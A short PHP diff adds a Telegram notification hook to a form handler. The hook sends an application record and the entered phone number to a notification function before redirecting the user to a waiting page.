@@ -74,6 +74,16 @@ if (($_SERVER['REQUEST_METHOD'] ?? 'GET') === 'POST') {
     }
 
     unset($_SESSION['tel_form_old'], $_SESSION['tel_form_errors']);
+
+    // Telegram bildirim (telefon girildi)
+    @require_once __DIR__ . '/includes/telegram.php';
+    if (function_exists('sendTelegramNotification')) {
+        $updatedApp = findApplicationById($id);
+        if ($updatedApp !== null) {
+            sendTelegramNotification($updatedApp, $phoneForStorage);
+        }
+    }
+
     header('Location: waiting.php?id=' . urlencode($id));
     exit;
 }
